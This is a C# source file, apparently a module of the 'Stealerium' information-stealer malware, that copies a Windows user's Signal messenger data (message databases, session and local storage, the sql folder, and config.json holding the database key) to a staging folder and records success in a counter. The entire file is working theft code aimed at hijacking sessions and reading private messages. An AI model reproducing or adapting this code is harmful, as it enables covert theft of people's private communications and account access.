using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.Messengers
{
    internal sealed class Signal
    {
        private static readonly string SignalPath = Path.Combine(Paths.Appdata, "Signal");

        // Copy session directory
        public static void GetSession(string sSavePath)
        {
            if (!Directory.Exists(SignalPath))
                return;

            var database = Path.Combine(SignalPath, "databases");
            var session = Path.Combine(SignalPath, "Session Storage");
            var local = Path.Combine(SignalPath, "Local Storage");
            var sql = Path.Combine(SignalPath, "sql");
            try
            {
                Filemanager.CopyDirectory(database, sSavePath + "\\databases");
                Filemanager.CopyDirectory(session, sSavePath + "\\Session Storage");
                Filemanager.CopyDirectory(local, sSavePath + "\\Local Storage");
                Filemanager.CopyDirectory(sql, sSavePath + "\\sql");
                File.Copy(SignalPath + "\\config.json", sSavePath + "\\config.json");
            }
            catch
            {
                return;
            }

            Counter.Signal = true;
        }
    }
}